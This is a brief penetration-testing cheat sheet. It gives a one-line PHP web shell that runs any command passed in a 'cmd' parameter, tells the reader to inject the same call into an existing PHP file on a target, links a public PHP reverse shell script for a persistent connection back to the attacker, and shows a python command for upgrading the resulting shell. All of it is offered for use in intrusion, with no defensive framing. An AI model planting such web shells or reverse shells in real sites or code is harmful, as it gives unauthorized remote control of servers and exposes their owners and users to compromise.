
Basic command injection just add `?cmd=COMMAND` to inject commands
```php
<?php system($_REQUEST['cmd']); ?>
```

Inject the following code in an existing PHP file to get the same effect:
```php
system($_GET['cmd']);
```

### Persistent Reverse Shell
Creates a connection from the target server to your local machine

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Upgrade shell
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
